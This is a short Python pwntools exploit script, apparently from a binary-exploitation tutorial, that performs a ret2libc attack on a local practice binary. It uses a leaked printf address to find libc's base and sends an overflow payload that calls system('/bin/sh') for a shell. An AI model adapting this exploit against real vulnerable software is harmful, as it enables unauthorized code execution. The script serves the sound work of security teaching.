#!/usr/bin/python3

## https://youtu.be/6zVWgFPZRro?t=3415

'''
Arch:     i386-32-little
RELRO:    Full RELRO       --- Can't modify the GOT
Stack:    No canary found
NX:       >> NX enabled    --- This prevents stack and heap execution
PIE:      PIE enabled      --- ASLR changes the address of libraries and stack/heap
                               PIE changes the address of the program
'''

from pwn import *

p = process('./ret2libc')

# Maybe you'd like to attach the process, so you can verify the values are correct
### ie confirm the library base is the same as listed in the `vmmap` command
### ie confirm that system is the same in gdb when you `x system`
### ie confirm that printf is the same the offset in the library when you binja
#pause()


p.recvuntil("LIBC Address Leak: ")
leak = int(p.recvline(keepends=False), 16)    # Leaks printf

# This is the version of libc that is used by __MY__ system
# You may have a different libc version being used when the program runs
# Check this by looking at the libc library path loaded when you run `vmmap` in gdb
# Then you can replace the below path with that library path
libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
#########################################################################################
#### Alternatively you can patch the ret2libc program to use a specific version of libc
#### This would be useful (eg) for the wargames  
####   so you can write your exploit with the 
####   same libc version as the wargame server
#########################################################################################

log.info(f"Leak found at {hex(leak)}")                      # libc base + offset
log.info(f"printf offset is {hex(libc.symbols['printf'])}") # offset

# (libc base + offset) - offset = libc base
# <ELF>.address sets the base address for all subsequent lookup operations
libc.address = leak - libc.symbols['printf']

log.info(f"Base address of libc is {hex(libc.address)}")
log.info(f"Function puts is at {hex(libc.symbols['system'])}")

payload = b''
payload += b'A' * 0x14                        # Pad 0x14 bytes to reach the return address location in the stack
payload += p32(libc.symbols['system'])        # Add the system function address
payload += b'B' * 4                           # Pad 4 bytes for correct function stack call layout
payload += p32(next(libc.search(b'/bin/sh'))) # Find the an address inside libc to `/bin/sh`

p.sendline(payload)
p.interactive()